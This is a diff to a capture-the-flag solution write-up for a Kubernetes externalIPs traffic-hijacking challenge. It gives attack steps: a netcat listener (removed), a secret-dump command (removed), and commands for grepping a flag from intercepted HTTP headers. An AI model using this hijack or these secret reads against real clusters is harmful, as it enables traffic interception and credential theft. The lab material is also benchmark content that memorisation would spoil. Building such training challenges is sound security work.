@@ -32,7 +32,7 @@
 Attacker pod (attack-ns) → Discover target service ClusterIP
   → Create malicious Service with externalIPs = target ClusterIP
   → All traffic to target IP routes to attacker pods
-  → Capture flag-bearing requests
+  → Capture flag-bearing X-Flag requests
 ```
 
 ## Step-by-Step Exploitation
@@ -69,26 +69,29 @@ EOF
 
 ```bash
 # From attacker pod, listen for redirected traffic
-kubectl exec -n attack-ns attacker-pod -- sh -c \
-  "nc -l -p 8080 -v"
+# The attacker pod runs a netcat loop that logs every captured request
+kubectl exec -n attack-ns attacker-pod -- cat /tmp/captured_requests.txt
 ```
 
-### Step 4: Read Flag from Intercepted Data or Directly
+### Step 4: Read Flag from Intercepted Data
 
 ```bash
-# The flag can be obtained from intercepted traffic headers
-# OR directly from the flag Secret
-kubectl get secret target-flag -n secure-ns -o jsonpath='{.data.flag}' | base64 -d
+# The flag is carried in the X-Flag header of requests sent by the flag-client
+kubectl exec -n attack-ns attacker-pod -- grep -o 'X-Flag: [^ ]*' /tmp/captured_requests.txt
 ```
 
 ## Flag Location
-- **Primary**: Secret `target-flag` in `secure-ns` namespace
+- **Primary**: `X-Flag` header in intercepted HTTP requests (sent by flag-client to the victim Service)
 - **Format**: `flag{k8s-22-<16-hex>}`
+
+> 攻击者的 attacker-sa 只有 attack-ns 内创建/读取 Service 的权限，无法读取
+> secure-ns 的 Secret；flag 只能通过流量劫持截获。
 
 ## Verification
 ```bash
 cd cve_challenges/scenarios/k8s/externalip-hijack && bash deploy.sh
-kubectl get secret target-flag -n secure-ns -o jsonpath='{.data.flag}' | base64 -d
+# 1. kubectl exec -n attack-ns attacker-pod -- cat /tmp/captured_requests.txt
+# 2. grep X-Flag from the captured requests
 bash teardown.sh
 ```
 
